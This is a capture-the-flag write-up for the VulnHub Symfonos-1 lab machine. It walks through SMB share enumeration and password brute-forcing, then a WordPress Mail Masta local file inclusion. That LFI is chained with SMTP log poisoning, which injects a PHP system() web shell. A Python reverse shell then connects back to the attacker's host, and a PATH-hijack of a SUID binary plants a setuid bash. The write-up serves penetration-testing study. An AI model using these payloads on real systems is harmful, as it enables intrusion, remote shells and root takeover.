# Table of contents

- [Recon](#recon)
  - [TCP/80 - HTTP](#tcp80---http)
    - [FFUF](#ffuf)
  - [TCP/139,445 - SMB](#tcp139445---smb)
    - [Enum4linux](#enum4linux)
    - [Crackmapexec+SMBMap](#crackmapexecsmbmap)
- [Initial Foothold](#initial-foothold)
  - [TCP/139,445 - SMB Fileshare Bruteforce](#tcp139445---smb-fileshare-bruteforce)
  - [TCP/80 - HTTP - Wordpress Plugin Exploit](#tcp80---http---wordpress-plugin-exploit)
- [Privilege Escalation](#privilege-escalation)
  - [Root - Via SUID Binary (Path Hijacking)](#root---via-suid-binary-path-hijacking)



# Recon
## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123]
└─# ffuf -u http://192.168.236.8/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,php' -fw 22

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.236.8/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 22
________________________________________________

                        [Status: 200, Size: 328, Words: 48, Lines: 25]
index.html              [Status: 200, Size: 328, Words: 48, Lines: 25]
index.html              [Status: 200, Size: 328, Words: 48, Lines: 25]
manual                  [Status: 301, Size: 315, Words: 20, Lines: 10]
:: Progress: [18460/18460] :: Job [1/1] :: 7016 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

## TCP/139,445 - SMB 
### Enum4linux
```
 --------------------------------------
|    Users via RPC on 192.168.236.8    |
 --------------------------------------
[*] Enumerating users via 'querydispinfo'
[+] Found 1 users via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 1 users via 'enumdomusers'
[+] After merging user results we have 1 users total:
'1000':
  username: helios
  name: ''
  acb: '0x00000010'
  description: ''
  
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\helios (Local User)
```
- `helios`

### Crackmapexec+SMBMap
```
┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123]
└─# crackmapexec smb $ip -u '' -p '' --shares
SMB         192.168.236.8   445    SYMFONOS         Share           Permissions     
SMB         192.168.236.8   445    SYMFONOS         -----           -----------     
SMB         192.168.236.8   445    SYMFONOS         print$                          
SMB         192.168.236.8   445    SYMFONOS         helios			
SMB         192.168.236.8   445    SYMFONOS         anonymous       READ            
SMB         192.168.236.8   445    SYMFONOS         IPC$                            

┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123]
└─# smbmap -H $ip 
[+] Guest session   	IP: 192.168.236.8:445	Name: unknown                                        
Disk                                                Permissions		Comment
----                                                -----------		-------
print$                                              NO ACCESS		Printer Drivers
helios                                              NO ACCESS		Helios personal share
anonymous                                           READ ONLY	
IPC$                                                NO ACCESS		IPC Service
```
- `helios`
- `anonymous`, READ 


# Initial Foothold
## TCP/139,445 - SMB Fileshare Bruteforce
1. Download all files from `anonymous` fileshare
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot]
	└─# smbclient //$ip/anonymous -c 'prompt;recurse;mget *'
	Enter WORKGROUP\root's password: 
	getting file \attention.txt of size 154 as attention.txt (8.8 KiloBytes/sec) (average 8.8 KiloBytes/sec)
	```
2. View `attention.txt`
	![](images/Pasted%20image%2020220124031308.png)
3. Generate username & password wordlist
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb]
	└─# cat > usernames.txt <<EOF
	> helios
	> Helios
	> zeus
	> Zeus
	> EOF
	┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb]
	└─# cat > passwords.txt <<EOF
	> epidioko
	> qwerty
	> baseball
	> EOF
	```
4. [Bruteforce SMB Fileshare](https://github.com/yufongg/SMB-Fileshare-Bruteforce)
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb]
	└─# ./smb_bruteforce.sh $ip usernames.txt passwords.txt helios
	Try: helios + epidioko
	Try: helios + qwerty
	Found Valid Combination helios:qwerty
	Try: helios + baseball
	Try: Helios + epidioko
	Try: Helios + qwerty
	Found Valid Combination Helios:qwerty
	Try: Helios + baseball
	Try: zeus + epidioko
	Try: zeus + qwerty
	Try: zeus + baseball
	Try: Zeus + epidioko
	Try: Zeus + qwerty
	Try: Zeus + baseball
	```
	![](images/Pasted%20image%2020220124031655.png)
5. Download all files from `helios` fileshare
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123]
	└─# smbclient //$ip/helios -U helios -c 'prompt;recurse;mget *'
	Enter WORKGROUP\helios's password: qwerty
	getting file \research.txt of size 432 as research.txt (21.1 KiloBytes/sec) (average 21.1 KiloBytes/sec)
	getting file \todo.txt of size 52 as todo.txt (25.4 KiloBytes/sec) (average 21.5 KiloBytes/sec)
	```
6. View downloaded files
	![](images/Pasted%20image%2020220124032036.png)
	- `/h3l105`

## TCP/80 - HTTP - Wordpress Plugin Exploit
1. Proceed to `/h3l105`
	![](images/Pasted%20image%2020220124032349.png)
	- Wordpress CMS
2. Enumerate wp users
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123]
	└─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://symfonos.local/h3l105 -e ap -f cli-no-color 2>&1 | tee "/root/vulnHub/Symfonos-1/192.168.56.123/scans/tcp80/tcp80_http_wpscan_plugin_enum.txt"
	[i] User(s) Identified:

	[+] admin
	 | Found By: Author Posts - Author Pattern (Passive Detection)
	 | Confirmed By:
	 |  Rss Generator (Passive Detection)
	 |  Wp Json Api (Aggressive Detection)
	 |   - http://symfonos.local/h3l105/index.php/wp-json/wp/v2/users/?per_page=100&page=1
	 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
	 |  Login Error Messages (Aggressive Detection)
	```
3. Enumerate wp plugins
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123]
	└─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://symfonos.local/h3l105 -e ap -f cli-no-color 2>&1 | tee "/root/vulnHub/Symfonos-1/192.168.56.123/scans/tcp80/tcp80_http_wpscan_plugin_enum.txt"
	[i] Plugin(s) Identified:

	[+] akismet
	 | Location: http://symfonos.local/h3l105/wp-content/plugins/akismet/
	 | Last Updated: 2021-10-01T18:28:00.000Z
	 | Readme: http://symfonos.local/h3l105/wp-content/plugins/akismet/readme.txt
	 | [!] The version is out of date, the latest version is 4.2.1
	 |
	 | Found By: Known Locations (Aggressive Detection)
	 |  - http://symfonos.local/h3l105/wp-content/plugins/akismet/, status: 200
	 |
	 | Version: 4.1.2 (100% confidence)
	 | Found By: Readme - Stable Tag (Aggressive Detection)
	 |  - http://symfonos.local/h3l105/wp-content/plugins/akismet/readme.txt
	 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
	 |  - http://symfonos.local/h3l105/wp-content/plugins/akismet/readme.txt

	[+] mail-masta
	 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
	 | Latest Version: 1.0 (up to date)
	 | Last Updated: 2014-09-19T07:52:00.000Z
	 | Readme: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
	 | [!] Directory listing is enabled
	 |
	 | Found By: Known Locations (Aggressive Detection)
	 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/, status: 200
	 |
	 | Version: 1.0 (100% confidence)
	 | Found By: Readme - Stable Tag (Aggressive Detection)
	 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
	 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
	 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt

	[+] site-editor
	 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
	 | Latest Version: 1.1.1 (up to date)
	 | Last Updated: 2017-05-02T23:34:00.000Z
	 | Readme: http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt
	 |
	 | Found By: Known Locations (Aggressive Detection)
	 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/, status: 200
	 |
	 | Version: 1.1.1 (80% confidence)
	 | Found By: Readme - Stable Tag (Aggressive Detection)
	 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt
	```
	- `site-editor 1.1.1`
	- `mail-masta 1.0`
4. Search exploits for `site-editor 1.1.1`
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb]
	└─# searchsploit site editor wordpress
	---------------------------------------------------------------------------------- 
	|Exploit Title   					    |  Path
	----------------------------------------------------------------------------------
	WordPress Plugin Site Editor 1.1.1 - Local File Inclusion   | php/webapps/44340.txt
	----------------------------------------------------------------------------------
	```
5. Seach exploits for `mail-masta 1.0`
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb]
	└─# searchsploit wordpress mail masta
	----------------------------------------------------------------------------------- 
	| Exploit Title 		                           | Path           
	----------------------------------------------------------------------------------- 
	WordPress Plugin Mail Masta 1.0 - Local File Inclusion     | php/webapps/40290.txt
	WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2) | php/webapps/50226.py
	WordPress Plugin Mail Masta 1.0 - SQL Injection            | php/webapps/41438.txt
	----------------------------------------------------------------------------------- 
	```
6. Use `WordPress Plugin Mail Masta 1.0 - Local File Inclusion`
	1. Exploitable parameter
		```
		http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=<LFI File>
		```
	2. Include `/etc/passwd`
		![](images/Pasted%20image%2020220124033333.png)
	3. Since `SMTP TCP/25` is up, poison SMTP log
		```
		┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb]
		└─# telnet $ip 25
		Trying 192.168.236.8...
		Connected to 192.168.236.8.
		Escape character is '^]'.
		220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
		MAIL FROM:asdf
		RCPT TO: helios
		DATA
		<?php system($_GET['c']); ?>
		.
		QUIT250 2.1.0 Ok
		250 2.1.5 Ok
		354 End data with <CR><LF>.<CR><LF>
		250 2.0.0 Ok: queued as 0CBB24081F

		221 2.0.0 Bye
		Connection closed by foreign host.
		```
	4. Include SMTP log file & test RCE
		```
		http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id;
		```
		![](images/Pasted%20image%2020220124033829.png)
	5. Check if python exists
		```
		┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb]
		└─# curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=which+python" | grep python
		/usr/bin/python
		```
	6. Execute Reverse Shell
		```
		# Curl does not work 
		http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=python+-c+'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.236.4",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
		```
		![](images/Pasted%20image%2020220124034857.png)
	7. Obtained www-data shell
		```
		┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb]
		└─# nc -nvlp 4444
		Ncat: Version 7.92 ( https://nmap.org/ncat )
		Ncat: Listening on :::4444
		Ncat: Listening on 0.0.0.0:4444
		Ncat: Connection from 192.168.236.8.
		Ncat: Connection from 192.168.236.8:37968.
		$ whoami;id
		whoami;id
		helios
		uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
		```
		![](images/Pasted%20image%2020220124034942.png)

# Privilege Escalation
## Root - Via SUID Binary (Path Hijacking)
1. Search for SUID binaries
	```
	helios@symfonos:/var/www/html/h3l105/wp-content/plugins/mail-masta/inc/campaign$ find / -perm -4000 2>/dev/null 
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/usr/lib/openssh/ssh-keysign
	/usr/bin/passwd
	/usr/bin/gpasswd
	/usr/bin/newgrp
	/usr/bin/chsh
	/usr/bin/chfn
	/opt/statuscheck <- Suspicious
	/bin/mount
	/bin/umount
	/bin/su
	/bin/ping
	```
2. Execute `/opt/statuscheck`
	```
	helios@symfonos:/var/www/html/h3l105/wp-content/plugins/mail-masta/inc/campaign$ /opt/statuscheck
	HTTP/1.1 200 OK
	Date: Mon, 24 Jan 2022 03:51:47 GMT
	Server: Apache/2.4.25 (Debian)
	Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
	ETag: "148-58c6b9bb3bc5b"
	Accept-Ranges: bytes
	Content-Length: 328
	Vary: Accept-Encoding
	Content-Type: text/html
	```
	- `curl` localhost?
3. View contents of `/opt/statuscheck` w/ `strings`
	![](images/Pasted%20image%2020220124035324.png)
	- Full Path of `curl` is not specified, susceptible to path hijacking
4. Exploit 
	1. Prepend `/tmp` to PATH environment
		```
		export PATH=/tmp:$PATH
		```
	2. Create `curl`, to spawn root shell
		```
		helios@symfonos:/tmp$ printf 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' > /tmp/curl; chmod 4777 /tmp/curl;
		
		helios@symfonos:/tmp$ cat /tmp/curl 
		cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
		```
	3. Execute `/opt/statuscheck`
	4. Obtain root shell
		```
		helios@symfonos:/tmp$ /opt/statuscheck 
		helios@symfonos:/tmp$ ls -la
		total 1088
		drwxrwxrwt  2 root   root      4096 Jan 23 22:00 .
		drwxr-xr-x 22 root   root      4096 Jun 28  2019 ..
		-rwsrwxrwx  1 helios helios      54 Jan 23 21:58 curl
		-rwsr-xr-x  1 root   helios 1099016 Jan 23 22:00 rootbash
		helios@symfonos:/tmp$ /tmp/rootbash -p
		rootbash-4.4# whoami
		root
		rootbash-4.4# 
		```
		![](images/Pasted%20image%2020220124040228.png)
5. Obtain Root Flag
	```
	rootbash-4.4# cat proof.txt 

		Congrats on rooting symfonos:1!

					 \ __
	--==/////////////[})))==*
					 / \ '          ,|
						`\`\      //|                             ,|
						  \ `\  //,/'                           -~ |
	   )             _-~~~\  |/ / |'|                       _-~  / ,
	  ((            /' )   | \ / /'/                    _-~   _/_-~|
	 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
	 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
	((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
	 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
		`\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
		 (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
		  ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
					   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
					   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
					  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
					  ;;;;'     (      ---~~/         `:::|       `\\.      
					  |'  _      `----~~~~'      /      `:|        ()))),      
				______/\/~    |                 /        /         (((((())  
			  /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
			 / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
			//  \ \                        /  |  \;;,\                 `   
		   (<_    \ \                    /',/-----'  _> 
			\_|     \\_                 //~;~~~~~~~~~ 
					 \_|               (,~~   
										\~\
										 ~~

		Contact me via Twitter @zayotic to give feedback!


	rootbash-4.4# 

	```
	![](images/Pasted%20image%2020220124040309.png)



---
Tags: #tcp/80-http/cms/wordpress-plugin #exploit/file-inclusion/lfi #tcp/80-http/rce #linux-priv-esc/suid/unknown-exec #linux-priv-esc/suid/path-hijacking 

---
